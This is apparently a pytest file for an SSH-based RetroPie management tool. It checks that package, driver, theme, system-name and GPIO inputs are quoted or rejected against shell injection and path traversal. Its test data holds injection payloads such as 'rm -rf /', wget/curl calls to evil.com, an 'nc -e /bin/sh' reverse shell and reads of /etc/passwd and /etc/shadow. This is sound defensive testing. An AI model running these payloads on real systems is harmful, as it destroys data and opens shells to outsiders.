"""Unit tests for command injection prevention."""

import shlex
from unittest.mock import MagicMock, patch

import pytest

from retromcp.config import RetroPieConfig
from retromcp.infrastructure.ssh_controller_repository import SSHControllerRepository
from retromcp.infrastructure.ssh_emulator_repository import SSHEmulatorRepository
from retromcp.infrastructure.ssh_system_repository import SSHSystemRepository
from retromcp.tools.hardware_tools import HardwareTools
from retromcp.tools.system_tools import SystemTools
from retromcp.tools.controller_tools import ControllerTools


class TestCommandInjectionPrevention:
    """Test command injection prevention across all tools."""

    def test_ssh_handler_install_packages_vulnerable(self) -> None:
        """Test that current install_packages is vulnerable to injection."""
        from retromcp.ssh_handler import RetroPieSSH
        
        mock_handler = MagicMock(spec=RetroPieSSH)
        mock_handler.execute_command.return_value = (0, "", "")
        
        # Try to inject command
        malicious_packages = [
            "vim; rm -rf /",  # Command injection
        ]
        
        # This demonstrates the vulnerability
        mock_handler.install_packages(malicious_packages)
        
        # Get the actual call
        if hasattr(mock_handler.install_packages, 'call_args'):
            # For a real vulnerable implementation, the command would contain the injection
            pass
        
        # For now, let's test a secure version
        from retromcp.secure_ssh_handler import SecureSSHHandler
        
        # A secure implementation should escape inputs
        secure_packages = [shlex.quote(p) for p in malicious_packages]
        expected_cmd = f"sudo apt-get install -y {' '.join(secure_packages)}"
        
        # The secure version should have quoted packages
        assert "rm -rf /" not in expected_cmd.replace(shlex.quote("vim; rm -rf /"), "")
        assert shlex.quote("vim; rm -rf /") in expected_cmd

    def test_hardware_tools_gpio_operations_validate_input(self) -> None:
        """Test that GPIO operations validate pin numbers."""
        mock_handler = MagicMock()
        mock_config = MagicMock(spec=RetroPieConfig)
        tools = HardwareTools(ssh_handler=mock_handler, config=mock_config)
        
        # Test invalid pin numbers
        invalid_pins = [
            -1,  # Negative
            41,  # Too high (max is 40)
            100,  # Way too high
            ";rm -rf /",  # String injection attempt
        ]
        
        for invalid_pin in invalid_pins:
            with pytest.raises(ValueError, match="Invalid GPIO pin"):
                tools.set_gpio_mode(invalid_pin, "out")

    def test_hardware_tools_gpio_mode_validates_mode(self) -> None:
        """Test that GPIO mode is validated."""
        mock_handler = MagicMock()
        mock_config = MagicMock(spec=RetroPieConfig)
        tools = HardwareTools(ssh_handler=mock_handler, config=mock_config)
        
        # Test invalid modes
        invalid_modes = [
            "in; ls",  # Command injection
            "out$(whoami)",  # Command substitution
            "pwm`date`",  # Backtick
            "up|id",  # Pipe
            "down&pwd",  # Background
        ]
        
        for invalid_mode in invalid_modes:
            with pytest.raises(ValueError, match="Invalid GPIO mode"):
                tools.set_gpio_mode(10, invalid_mode)

    def test_controller_tools_test_controller_escapes_device(self) -> None:
        """Test that controller device paths are escaped."""
        mock_handler = MagicMock()
        mock_handler.execute_command.return_value = (0, "Controller test output", "")
        mock_config = MagicMock(spec=RetroPieConfig)
        
        tools = ControllerTools(ssh_handler=mock_handler, config=mock_config)
        
        # Try to inject via device path
        malicious_device = "/dev/input/js0; cat /etc/passwd"
        
        result = tools.test_controller(malicious_device)
        
        # Check the command
        cmd = mock_handler.execute_command.call_args[0][0]
        
        # Device should be quoted
        assert shlex.quote(malicious_device) in cmd
        # Raw injection should not be present
        assert "cat /etc/passwd" not in cmd.replace(shlex.quote(malicious_device), "")

    def test_system_repository_package_operations_escape_names(self) -> None:
        """Test that SystemRepository escapes package names."""
        mock_client = MagicMock()
        mock_client.execute_command.return_value = (0, "", "")
        
        repo = SSHSystemRepository(mock_client)
        
        # Try various injection attempts
        malicious_packages = [
            "vim; wget evil.com/malware",
            "nano$(curl evil.com)",
            "git`nc -e /bin/sh evil.com 1234`",
            "python3|tee /etc/shadow",
            "curl&chmod 777 /etc",
        ]
        
        repo.install_packages(malicious_packages)
        
        # Get the install command
        calls = mock_client.execute_command.call_args_list
        install_cmd = None
        for call in calls:
            cmd = call[0][0]
            if "apt-get install" in cmd:
                install_cmd = cmd
                break
                
        assert install_cmd is not None
        
        # Each package should be quoted
        for package in malicious_packages:
            assert shlex.quote(package) in install_cmd

    def test_controller_repository_driver_validation(self) -> None:
        """Test that controller drivers are validated."""
        mock_client = MagicMock()
        repo = SSHControllerRepository(mock_client)
        
        # Test invalid driver names
        invalid_drivers = [
            "xboxdrv; rm -rf /",
            "ds4drv$(whoami)",
            "driver`date`",
            "../../../bin/sh",
            "driver\x00name",  # Null byte
            "driver\nname",  # Newline
        ]
        
        for invalid_driver in invalid_drivers:
            with pytest.raises(ValueError, match="Invalid driver name"):
                repo.install_driver(invalid_driver)

    def test_emulator_repository_system_validation(self) -> None:
        """Test that emulator system names are validated."""
        mock_client = MagicMock()
        repo = SSHEmulatorRepository(mock_client)
        
        # Test invalid system names
        invalid_systems = [
            "n64; cat /etc/passwd",
            "psx$(id)",
            "dreamcast`ls -la`",
            "../../../etc/passwd",
            "system|nc",
            "system&telnet",
        ]
        
        for invalid_system in invalid_systems:
            with pytest.raises(ValueError, match="Invalid system name"):
                repo.check_bios_files(invalid_system)

    def test_hardware_tools_theme_validation(self) -> None:
        """Test that theme names are validated."""
        mock_handler = MagicMock()
        mock_handler.execute_command.return_value = (0, "carbon", "")
        mock_config = MagicMock(spec=RetroPieConfig)
        
        tools = HardwareTools(ssh_handler=mock_handler, config=mock_config)
        
        # Test invalid theme names
        invalid_themes = [
            "carbon; rm -rf /",
            "theme$(whoami)",
            "theme`date`",
            "../../../evil",
            "theme|ls",
            "theme&pwd",
        ]
        
        for invalid_theme in invalid_themes:
            with pytest.raises(ValueError, match="Invalid theme name"):
                tools.set_theme(invalid_theme)

    def test_path_traversal_prevention(self) -> None:
        """Test that path traversal attempts are blocked."""
        mock_handler = MagicMock()
        mock_config = MagicMock(spec=RetroPieConfig)
        tools = SystemTools(ssh_handler=mock_handler, config=mock_config)
        
        # Test path traversal attempts
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/../etc/../etc/passwd",
            "logs/../../../../etc/shadow",
        ]
        
        for path in traversal_attempts:
            with pytest.raises(ValueError, match="Path traversal attempt"):
                tools.check_logs(path)

    def test_error_sanitization_in_responses(self) -> None:
        """Test that error messages don't leak sensitive info."""
        mock_handler = MagicMock()
        mock_handler.execute_command.side_effect = Exception(
            "Failed to connect to 192.168.1.100 with password 'secret123'"
        )
        mock_config = MagicMock(spec=RetroPieConfig)
        
        tools = SystemTools(ssh_handler=mock_handler, config=mock_config)
        
        result = tools.get_system_info()
        
        # Error should be sanitized
        assert "secret123" not in str(result)
        assert "192.168.1.100" not in str(result)
        assert "[REDACTED]" in str(result) or "[IP]" in str(result)